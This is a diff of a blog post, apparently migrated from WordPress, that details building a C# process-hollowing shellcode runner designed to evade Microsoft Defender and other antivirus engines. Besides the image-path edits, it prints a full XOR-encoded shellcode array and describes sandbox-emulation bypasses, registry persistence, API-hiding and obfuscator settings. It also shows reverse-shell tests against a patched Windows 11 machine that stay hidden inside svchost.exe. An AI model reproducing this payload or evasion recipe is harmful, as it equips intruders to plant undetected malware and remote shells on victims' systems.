@@ -1,21 +1,9 @@
 ---
-id: 1351
 title: 'It’s All FUD and Games: Undetectable Process Hollowing on Windows'
 date: '2023-10-08T00:46:11-05:00'
 author: 'Logan Elliott'
 excerpt: 'This post details how I created a process hollowing shellcode runner that is fully undetectable by Microsoft Defender as of October 2023.'
 layout: post
-guid: 'https://loganelliottinfosec.com/?p=1351'
-permalink: /index.php/2023/10/08/its-all-fud-and-games-undetectable-process-hollowing-on-windows/
-obfx-header-scripts:
-    - ''
-obfx-footer-scripts:
-    - ''
-post_sidebar:
-    - right
-single_post_layouts:
-    - default
-image: 'http://loganelliottinfosec.com/wp-content/uploads/2023/10/fd99b01a-0d4c-4af2-a94c-73e814770c35.webp'
 tags:
     - 'Antivirus Evasion'
     - 'C#'
@@ -23,9 +11,10 @@ tags:
     - 'Process Hollowing'
     - Windows
 ---
-![](https://loganelliottinfosec.com/wp-content/uploads/2023/10/fd99b01a-0d4c-4af2-a94c-73e814770c35.webp)
+![post-image](/assets/images/fd99b01a-0d4c-4af2-a94c-73e814770c35.webp)
 
 **Table of Contents**
+
 * TOC
 {:toc}
 
@@ -114,11 +103,11 @@ Now that the fundamentals are out of the way, I will explain how I created the f
 
 To start, I created a new “Console App (.NET Framework)” project in Visual Studio 2022:
 
-![](http://loganelliottinfosec.com/wp-content/uploads/2023/09/vs-console-app.png)
+![vs-console-app](/assets/images/vs-console-app-768x505.png)
 
 I have decided to name this project “HollowGhost” because it fits, and more importantly, it sounds cool. 😎
 
-![](http://loganelliottinfosec.com/wp-content/uploads/2023/09/create-cs-project.png)
+![create-cs-project](/assets/images/create-cs-project-768x505.png)
 
 First, we must import the proper namespaces needed for this program.
 
@@ -347,7 +336,7 @@ Also, the PE file’s name will change in several of these screenshots. This is 
 
 So, how does the initial shellcode runner hold up?
 
-![](http://loganelliottinfosec.com/wp-content/uploads/2023/10/baseline-results-742x1024.png)
+![baseline-results](/assets/images/baseline-results-742x1024.png)
 
 Well, the answer is… not very well.
 
@@ -403,7 +392,7 @@ We also add a for loop to decrypt the XOR payload at runtime.
 
 So, what are the results for this version?
 
-![](http://loganelliottinfosec.com/wp-content/uploads/2023/10/msfvenom-xor-results-743x1024.png)
+![msfvenom-xor-results](/assets/images/msfvenom-xor-results-743x1024.png)
 
 And.. there is no change in the detection rating.
 
@@ -452,7 +441,7 @@ C:UsershackerDesktop>.XorCrypt.exe
 The XOR payload is: 0x56, 0xe2, 0x29, 0x4e, 0x5a, 0x42, 0x66, 0xaa, 0xaa, 0xaa, 0xeb, 0xfb, 0xeb, 0xfa, 0xf8, 0xfb, 0xfc, 0xe2, 0x9b, 0x78, 0xcf, 0xe2, 0x21, 0xf8, 0xca, 0xe2, 0x21, 0xf8, 0xb2, 0xe2, 0x21, 0xf8, 0x8a, 0xe7, 0x9b, 0x63, 0xe2, 0x21, 0xd8, 0xfa, 0xe2, 0xa5, 0x1d, 0xe0, 0xe0, 0xe2, 0x9b, 0x6a, 0x06, 0x96, 0xcb, 0xd6, 0xa8, 0x86, 0x8a, 0xeb, 0x6b, 0x63, 0xa7, 0xeb, 0xab, 0x6b, 0x48, 0x47, 0xf8, 0xeb, 0xfb, 0xe2, 0x21, 0xf8, 0x8a, 0x21, 0xe8, 0x96, 0xe2, 0xab, 0x7a, 0xcc, 0x2b, 0xd2, 0xb2, 0xa1, 0xa8, 0xa5, 0x2f, 0xd8, 0xaa, 0xaa, 0xaa, 0x21, 0x2a, 0x22, 0xaa, 0xaa, 0xaa, 0xe2, 0x2f, 0x6a, 0xde, 0xcd, 0xe2, 0xab, 0x7a, 0x21, 0xe2, 0xb2, 0xfa, 0xee, 0x21, 0xea, 0x8a, 0xe3, 0xab, 0x7a, 0x49, 0xfc, 0xe2, 0x55, 0x63, 0xe7, 0x9b, 0x63, 0xeb, 0x21, 0x9e, 0x22, 0xe2, 0xab, 0x7c, 0xe2, 0x9b, 0x6a, 0xeb, 0x6b, 0x63, 0xa7, 0x06, 0xeb, 0xab, 0x6b, 0x92, 0x4a, 0xdf, 0x5b, 0xe6, 0xa9, 0xe6, 0x8e, 0xa2, 0xef, 0x93, 0x7b, 0xdf, 0x72, 0xf2, 0xee, 0x21, 0xea, 0x8e, 0xe3, 0xab, 0x7a, 0xcc, 0xeb, 0x21, 0xa6, 0xe2, 0xee, 0x21, 0xea, 0xb6, 0xe3, 0xab, 0x7a, 0xeb, 0x21, 0xae, 0x22, 0xeb, 0xf2, 0xe2, 0xab, 0x7a, 0xeb, 0xf2, 0xf4, 0xf3, 0xf0, 0xeb, 0xf2, 0xeb, 0xf3, 0xeb, 0xf0, 0xe2, 0x29, 0x46, 0x8a, 0xeb, 0xf8, 0x55, 0x4a, 0xf2, 0xeb, 0xf3, 0xf0, 0xe2, 0x21, 0xb8, 0x43, 0xe1, 0x55, 0x55, 0x55, 0xf7, 0xe2, 0x9b, 0x71, 0xf9, 0xe3, 0x14, 0xdd, 0xc3, 0xc4, 0xc3, 0xc4, 0xcf, 0xde, 0xaa, 0xeb, 0xfc, 0xe2, 0x23, 0x4b, 0xe3, 0x6d, 0x68, 0xe6, 0xdd, 0x8c, 0xad, 0x55, 0x7f, 0xf9, 0xf9, 0xe2, 0x23, 0x4b, 0xf9, 0xf0, 0xe7, 0x9b, 0x6a, 0xe7, 0x9b, 0x63, 0xf9, 0xf9, 0xe3, 0x10, 0x90, 0xfc, 0xd3, 0x0d, 0xaa, 0xaa, 0xaa, 0xaa, 0x55, 0x7f, 0x42, 0xa4, 0xaa, 0xaa, 0xaa, 0x9b, 0x93, 0x98, 0x84, 0x9b, 0x9c, 0x92, 0x84, 0x9b, 0x84, 0x98, 0x9a, 0x93, 0xaa, 0xf0, 0xe2, 0x23, 0x6b, 0xe3, 0x6d, 0x6a, 0x11, 0xab, 0xaa, 0xaa, 0xe7, 0x9b, 0x63, 0xf9, 0xf9, 0xc0, 0xa9, 0xf9, 0xe3, 0x10, 0xfd, 0x23, 0x35, 0x6c, 0xaa, 0xaa, 0xaa, 0xaa, 0x55, 0x7f, 0x42, 0xd0, 0xaa, 0xaa, 0xaa, 0x85, 0xf9, 0xfd, 0xfb, 0xdf, 0xc9, 0xdb, 0xf3, 0x9f, 0xc8, 0x9a, 0xc5, 0xc7, 0xf9, 0xd3, 0xce, 0xe0, 0xfb, 0x9b, 0xeb, 0xda, 0xce, 0xcd, 0xed, 0xf9, 0xdd, 0xf2, 0xc3, 0xeb, 0xc8, 0xfa, 0xfa, 0xc0, 0x99, 0xe2, 0x98, 0x98, 0x9d, 0xe2, 0xc2, 0xe3, 0xfd, 0xeb, 0xf0, 0xff, 0xfd, 0xcc, 0xc3, 0xc5, 0xe8, 0x9c, 0xec, 0xde, 0xd3, 0xed, 0xdf, 0xe1, 0x87, 0xfb, 0xc4, 0xf2, 0xe4, 0xee, 0xee, 0xc3, 0xfd, 0xd3, 0x9f, 0xcb, 0x92, 0xdc, 0xf8, 0xe5, 0xe2, 0xde, 0xfd, 0xef, 0xce, 0xc8, 0xf2, 0xf5, 0xdd, 0xef, 0xc9, 0xfe, 0xfa, 0xe9, 0xe7, 0xf9, 0xf3, 0xc3, 0x9a, 0xec, 0xc8, 0xf2, 0xed, 0xf9, 0xfa, 0xd8, 0xcf, 0xc0, 0xfa, 0xe1, 0xf8, 0x9f, 0xdf, 0xe4, 0xf5, 0xe8, 0xfd, 0xfb, 0xf3, 0x98, 0xdc, 0xc5, 0xd0, 0x98, 0xfe, 0xfd, 0xe1, 0xd2, 0xaa, 0xe2, 0x23, 0x6b, 0xf9, 0xf0, 0xeb, 0xf2, 0xe7, 0x9b, 0x63, 0xf9, 0xe2, 0x12, 0xaa, 0x98, 0x02, 0x2e, 0xaa, 0xaa, 0xaa, 0xaa, 0xfa, 0xf9, 0xf9, 0xe3, 0x6d, 0x68, 0x41, 0xff, 0x84, 0x91, 0x55, 0x7f, 0xe2, 0x23, 0x6c, 0xc0, 0xa0, 0xf5, 0xe2, 0x23, 0x5b, 0xc0, 0xb5, 0xf0, 0xf8, 0xc2, 0x2a, 0x99, 0xaa, 0xaa, 0xe3, 0x23, 0x4a, 0xc0, 0xae, 0xeb, 0xf3, 0xe3, 0x10, 0xdf, 0xec, 0x34, 0x2c, 0xaa, 0xaa, 0xaa, 0xaa, 0x55, 0x7f, 0xe7, 0x9b, 0x6a, 0xf9, 0xf0, 0xe2, 0x23, 0x5b, 0xe7, 0x9b, 0x63, 0xe7, 0x9b, 0x63, 0xf9, 0xf9, 0xe3, 0x6d, 0x68, 0x87, 0xac, 0xb2, 0xd1, 0x55, 0x7f, 0x2f, 0x6a, 0xdf, 0xb5, 0xe2, 0x6d, 0x6b, 0x22, 0xb9, 0xaa, 0xaa, 0xe3, 0x10, 0xee, 0x5a, 0x9f, 0x4a, 0xaa, 0xaa, 0xaa, 0xaa, 0x55, 0x7f, 0xe2, 0x55, 0x65, 0xde, 0xa8, 0x41, 0x00, 0x42, 0xff, 0xaa, 0xaa, 0xaa, 0xf9, 0xf3, 0xc0, 0xea, 0xf0, 0xe3, 0x23, 0x7b, 0x6b, 0x48, 0xba, 0xe3, 0x6d, 0x6a, 0xaa, 0xba, 0xaa, 0xaa, 0xe3, 0x10, 0xf2, 0x0e, 0xf9, 0x4f, 0xaa, 0xaa, 0xaa, 0xaa, 0x55, 0x7f, 0xe2, 0x39, 0xf9, 0xf9, 0xe2, 0x23, 0x4d, 0xe2, 0x23, 0x5b, 0xe2, 0x23, 0x70, 0xe3, 0x6d, 0x6a, 0xaa, 0x8a, 0xaa, 0xaa, 0xe3, 0x23, 0x53, 0xe3, 0x10, 0xb8, 0x3c, 0x23, 0x48, 0xaa, 0xaa, 0xaa, 0xaa, 0x55, 0x7f, 0xe2, 0x29, 0x6e, 0x8a, 0x2f, 0x6a, 0xde, 0x18, 0xcc, 0x21, 0xad, 0xe2, 0xab, 0x69, 0x2f, 0x6a, 0xdf, 0x78, 0xf2, 0x69, 0xf2, 0xc0, 0xaa, 0xf3, 0x11, 0x4a, 0xb7, 0x80, 0xa0, 0xeb, 0x23, 0x70, 0x55, 0x7f 
 ```
 
-![](http://loganelliottinfosec.com/wp-content/uploads/2023/10/XorCrypt-output.png)
+![xorcrypt-output](/assets/images/XorCrypt-output.png)
 
 Now, we will take the new custom XOR payload and put it within the shellcode runner, ensuring that we also update the decryption functionality:
 
@@ -466,7 +455,7 @@ Now, we will take the new custom XOR payload and put it within the shellcode run
 
 Now, to scan the file once again:
 
-![](http://loganelliottinfosec.com/wp-content/uploads/2023/10/custom-xor-results-743x1024.png)
+![custom-xor-results](/assets/images/custom-xor-results-743x1024.png)
 
 There is no change in detection rating when using a custom XOR encrypter for the payload.
 
@@ -498,7 +487,7 @@ I then created a sub-directory called **Evasion**.
 
 Now, to keep all of the emulation evasion code in one place, I created an external class named **Evasion.cs**.
 
-![](http://loganelliottinfosec.com/wp-content/uploads/2023/10/evasion-cs-ext-class.png)
+![evasion-cs-ext-class](/assets/images/evasion-cs-ext-class.png)
 
 ### Implementing The Emulation Evasion Code
 
@@ -658,7 +647,7 @@ But just so we are all on the same page regarding the detection results, I thoug
 
 Just as before, I created an external class aptly named **Persistence.cs**:
 
-![](http://loganelliottinfosec.com/wp-content/uploads/2023/10/persistence-cs-ext-class.png)
+![persistence-cs-ext-class](/assets/images/persistence-cs-ext-class.png)
 
 The code contained in this external class writes to the registry, creating a new registry key value that will cause the HollowGhost.exe file to be executed at startup:
 
@@ -747,7 +736,7 @@ In the future, I may modify the shellcode runner to be persistent without writin
 
 I began by testing the version of the PE containing all of the emulator bypass techniques:
 
-![](http://loganelliottinfosec.com/wp-content/uploads/2023/10/all-sandbox-evasion-results-746x1024.png)
+![all-sandbox-evasion-results](/assets/images/all-sandbox-evasion-results-746x1024.png)
 
 We are down to a detection rating of 10/40 versus the 15/40 rating for the previous version without sandbox evasion.
 
@@ -771,7 +760,7 @@ Since the malicious portion of the code is never executed within the sandbox, th
 
 So what are the results?
 
-![](http://loganelliottinfosec.com/wp-content/uploads/2023/10/filename-check-results-746x1024.png)
+![filename-check-results](/assets/images/filename-check-results-746x1024.png)
 
 #### Non-Emulated APIs Bypass
 
@@ -797,7 +786,7 @@ Since the sandbox is not able to properly emulate these APIs, the allocation wil
 
 Therefore, the malicious code remains undetected.
 
-![](http://loganelliottinfosec.com/wp-content/uploads/2023/10/non-emulated-apis-results-746x1024.png)
+![non-emulated-apis-results](/assets/images/non-emulated-apis-results-746x1024.png)
 
 #### Sleep Timer Bypass
 
@@ -813,7 +802,7 @@ By using the **DateTime** object with the **Now** method to retrieve the local s
 
 If the time lapse is less than 1.5 seconds, we can assume that the call was emulated and exit before the malicious code is reached.
 
-![](http://loganelliottinfosec.com/wp-content/uploads/2023/10/sleep-timer-results-746x1024.png)
+![sleep-timer-results](/assets/images/sleep-timer-results-746x1024.png)
 
 #### Fill Memory Bypass
 
@@ -831,7 +820,7 @@ As a svchost.exe process, utilizing 1 GB of memory on a Windows system will stic
 
 However, I must say that svchost.exe, using even 100 MB of memory on the bare-metal host, will likely raise some eyebrows as well, so that is the main caveat of this technique.
 
-![](http://loganelliottinfosec.com/wp-content/uploads/2023/10/fill-memory-results-746x1024.png)
+![fill-memory-results](/assets/images/fill-memory-results-746x1024.png)
 
 #### Many Iterations Bypass
 
@@ -845,7 +834,7 @@ However, this level of operation *is* quite taxing for an emulator to perform.
 
 Since the emulator cannot handle this, it will often keep the heuristics engine from emulating the rest of the program, thus keeping the malicious portion of the code from being analyzed.
 
-![](http://loganelliottinfosec.com/wp-content/uploads/2023/10/many-iterations-results-746x1024.png)
+![many-iterations-results](/assets/images/many-iterations-results-746x1024.png)
 
 #### And Then There Was One…​​​
 
@@ -971,13 +960,13 @@ I found that by tweaking the settings in Babel, I could get the detection rate d
 
 These were the settings I used:
 
-![](http://loganelliottinfosec.com/wp-content/uploads/2023/10/advanced-babel-settings.png)
+![advanced-babel-settings](/assets/images/advanced-babel-settings.png)
 
 This allowed me to obfuscate the control flow of the program using the “goto” algorithm.
 
 Additionally, I set it to encrypt all strings with XOR.
 
-![](http://loganelliottinfosec.com/wp-content/uploads/2023/10/babel-obfuscated-1-40-detect-rate-741x1024.png)
+![babel-obfuscated-1-40-detect-rate](/assets/images/babel-obfuscated-1-40-detect-rate-741x1024.png)
 
 While this dramatically reduced the detection rate, I could not bypass ESET NOD32.
 
@@ -1001,7 +990,7 @@ Within the free version of Agile.NET, I configured the settings to perform code 
 
 So, did this get past NOD32?
 
-![](http://loganelliottinfosec.com/wp-content/uploads/2023/10/agile-net-obfuscator-1-40-detection-rate-743x1024.png)
+![agile-net-obfuscator-1-40-detection-rate](/assets/images/agile-net-obfuscator-1-40-detection-rate-743x1024.png)
 
 Yeah, it did, just for it to get flagged by IKARUS…
 
@@ -1011,13 +1000,13 @@ At this point in my quest to determine what specific part of my shellcode runner
 
 I booted up another Windows 11 virtual machine with Microsoft Defender configured and ran the tool against the unobfuscated version of my executable.
 
-![](http://loganelliottinfosec.com/wp-content/uploads/2023/10/defender-check-with-persistence-code.png)
+![defender-check-with-persistence-code](/assets/images/defender-check-with-persistence-code.png)
 
 Remember how I said earlier that the persistence code I implemented would come back to bite me in the ass? Well, here it is, and it quite literally would “byte” me in the ass.
 
 If you look closely at the ASCII representation of the bad bytes in the file, you will notice that the persistence code that writes to the registry is triggering the detection by Windows Defender, as well as the Win32 API calls:
 
-![](http://loganelliottinfosec.com/wp-content/uploads/2023/10/registry-underlined-defender-check.png)
+![registry-underlined-defender-check](/assets/images/registry-underlined-defender-check.png)
 
 One problem at a time.
 
@@ -1029,7 +1018,7 @@ After removing the **Persistence.cs** external class and the related method call
 
 What were the results?
 
-![](http://loganelliottinfosec.com/wp-content/uploads/2023/10/no-persistence-agile-obfuscated-results-741x1024.png)
+![no-persistence-agile-obfuscated-results](/assets/images/no-persistence-agile-obfuscated-results-741x1024.png)
 
 Haha, I was finally undetectable at scan-time!
 
@@ -1041,7 +1030,7 @@ While I had achieved no detections at scan-time, I had done it through the use o
 
 Without using the Agile.NET obfuscator, my detection rating was still at 6/40.
 
-![](http://loganelliottinfosec.com/wp-content/uploads/2023/10/no-obfuscation-no-persistence-results-740x1024.png)
+![no-obfuscation-no-persistence-results](/assets/images/no-obfuscation-no-persistence-results-740x1024.png)
 
 Most importantly, I was still being detected by Microsoft Defender without a third-party obfuscator.
 
@@ -1055,7 +1044,7 @@ While I slightly lowered the detection rate by removing the persistence code fro
 
 When running DefenderCheck against the new version of the shellcode runner that does not contain the persistence code, you can see that several of the Win32 APIs I employed are shown within the bad bytes:
 
-![](http://loganelliottinfosec.com/wp-content/uploads/2023/10/defender-check-api-bad-bytes-underlined.png)
+![defender-check-api-bad-bytes-underlined](/assets/images/defender-check-api-bad-bytes-underlined.png)
 
 Given these results, I knew I needed to find a way to call all of the Win32 API functions responsible for performing the process hollowing injection without the antivirus engines noticing.
 
@@ -1243,7 +1232,7 @@ The functionality remains the same, but by using custom delegate functions to ca
 
 The results?
 
-![](http://loganelliottinfosec.com/wp-content/uploads/2023/10/custom-delegate-functions-results-659x1024.png)
+![custom-delegate-functions-results](/assets/images/custom-delegate-functions-results-659x1024.png)
 
 Outstanding!
 
@@ -1287,7 +1276,7 @@ I first attempted to obfuscate the path string that is passed to **CreateProcess
 
 Here were the results:
 
-![string-concat-results](https://loganelliottinfosec.com/wp-content/uploads/2023/10/string-concat-results-677x1024.png)
+![string-concat-results](/assets/images/string-concat-results-677x1024.png)
 
 I was still being detected by IKARUS, so I decided to try encrypting the string using AES and decrypting it at runtime before passing it to **CreateProcess**.
 
@@ -1408,7 +1397,7 @@ I then tweaked the **Run** method so that the encrypted file path string is decr
 
 Unfortunately, this led to the same results as before:
 
-![enc-path-results](https://loganelliottinfosec.com/wp-content/uploads/2023/10/enc-path-results-678x1024.png)
+![enc-path-results](/assets/images/enc-path-results-678x1024.png)
 
 ### The Compromise
 
@@ -1432,11 +1421,11 @@ Implementing that level of obfuscation would require more time and resources tha
 
 After obfuscating the version of the shellcode runner that utilizes string concatenation with only the default settings in Babel, I was able to remain undetected by IKARUS:
 
-![fud-babel-obf-string-concat](https://loganelliottinfosec.com/wp-content/uploads/2023/10/fud-babel-obf-string-concat-679x1024.png)
+![fud-babel-obf-string-concat](/assets/images/fud-babel-obf-string-concat-679x1024.png)
 
 I achieved the same results with the version that AES encrypts the file path string using the default obfuscation settings in Babel:
 
-![fud-babel-obf-enc-path-results](https://loganelliottinfosec.com/wp-content/uploads/2023/10/fud-babel-obf-enc-path-results-739x1024.png)
+![fud-babel-obf-enc-path-results](/assets/images/fud-babel-obf-enc-path-results-739x1024.png)
 
 ## Defeating Defender ⚔️🛡️
 
@@ -1464,11 +1453,11 @@ The victim machine:
 
 ***Windows 11 Enterprise VM:*** fully updated/patched and running on the latest build for 22H2 as of the time of writing:
 
-![win11-build](https://loganelliottinfosec.com/wp-content/uploads/2023/10/win11-build-768x228.png)
+![win11-build](/assets/images/win11-build-768x228.png)
 
 I attached both the Kali VM and Windows 11 VM to an internal network within VirtualBox:
 
-![internal-network-vbox.png](https://loganelliottinfosec.com/wp-content/uploads/2023/10/internal-network-vbox.png)
+![internal-network-vbox](/assets/images/internal-network-vbox.png)
 
 This allowed both virtual machines to communicate with each other and, more importantly, did not allow either to reach the internet.
 
@@ -1476,27 +1465,29 @@ Restricting the internet access for the Windows 11 VM was a necessary precaution
 
 Additionally, I turned both "Automatic sample submission" and "Cloud-delivered protection" off in the Defender settings:
 
-![auto-sample-submit-turned-off](https://loganelliottinfosec.com/wp-content/uploads/2023/10/auto-sample-submit-turned-off.png)
+![auto-sample-submit-turned-off](/assets/images/auto-sample-submit-turned-off.png)
 
-![auto-sample-submit-turned-off](https://loganelliottinfosec.com/wp-content/uploads/2023/10/cloud-delivered-prot-turned-off.png)
+![cloud-delivered-prot-turned-off](/assets/images/cloud-delivered-prot-turned-off.png)
 
 I also set an exclusion in Defender for the shared folder containing the PE files.
 
 This was to aid in testing when transferring files to the Windows 11 VM:
 
-![shared-folder-exclusion](https://loganelliottinfosec.com/wp-content/uploads/2023/10/shared-folder-exclusion-768x312.png)
+![shared-folder-exclusion](/assets/images/shared-folder-exclusion-768x312.png)
 
 "Real-time protection" was enabled, and all other Microsoft Defender settings were left unmodified:
 
-![rtp-enabled](https://loganelliottinfosec.com/wp-content/uploads/2023/10/rtp-enabled.png)
+![rtp-enabled](/assets/images/rtp-enabled.png)
 
 I transferred the shellcode runner from the shared folder, which was excluded from scanning, to the Desktop:
 
-![]()
+![string-concat-pe-in-shared-folder](/assets/images/string-concat-pe-in-shared-folder-768x391.png)
+
+![string-concat-pe-in-desktop](/assets/images/string-concat-pe-in-desktop-768x394.png)
 
 With the shellcode runner placed directly in the Desktop, running a "Quick Scan" with Microsoft Defender results in no detection!
 
-![]()
+![no-detection-quick-scan](/assets/images/no-detection-quick-scan.png)
 
 Time to test against runtime...
 
@@ -1506,7 +1497,7 @@ Kali VM: **192.168.1.2**
 
 Windows 11 VM: **192.168.1.3**
 
-![]()
+![met-rev-https-def-tsk-mgr](/assets/images/met-rev-https-def-tsk-mgr.gif)
 
 Success!
 
@@ -1520,9 +1511,9 @@ However, there is one more problem to solve...
 
 While the shellcode runner executes and I receive a reverse shell without triggering Defender, if a scan is run *while* the Meterpreter session is active, Defender will detect the behavior of the Meterpreter code running within the hollowed-out svchost.exe process:
 
-![]()
+![met-svchost-detected](/assets/images/met-svchost-detected.gif)
 
-![]()
+![details-met-svchost-detection](/assets/images/details-met-svchost-detection.png)
 
 However, there is a simple solution to this problem...
 
@@ -1540,13 +1531,13 @@ The payload I chose was:
 
 After swapping out the payload, I transferred the new version of the shellcode runner named "HollowGhostTcp" to the Windows 11 VM and tested it:
 
-![]()
+![scan-time-undetected-both-runners](/assets/images/scan-time-undetected-both-runners.gif)
 
 Once again, both versions of the shellcode runner remained undetected during scan-time.
 
 #### Testing at Runtime
 
-![]()
+![clearer-tcp-undetected-runtime-tskmgr](/assets/images/clearer-tcp-undetected-runtime-tskmgr.gif)
 
 The reverse shell is returned!
 
@@ -1556,11 +1547,13 @@ But, searching for the PID of the svchost.exe process in Task Manager shows only
 
 Thus allowing me to remain undetected by end-users.
 
+![centered-terminate-svchost-warning](/assets/images/centered-terminate-svchost-warning.png)
+
 Additionally, the lovely little warning that Windows gives when you attempt to terminate a svchost.exe process may also help dissuade end-users. ;P
 
 #### FUD During On-Demand Scanning With Shell
 
-![]()
+![whoami-tcp-active-scan-undetected](/assets/images/whoami-tcp-active-scan-undetected.gif)
 
 Victory! 🏆
 
@@ -1570,7 +1563,7 @@ The shellcode runner, which employs AES encryption to obfuscate the file path st
 
 **`windows/x64/shell/reverse_tcp`**
 
-![]()
+![enc-path-runner-fud-on-demand-scan](/assets/images/enc-path-runner-fud-on-demand-scan.gif)
 
 ## Conclusion
 
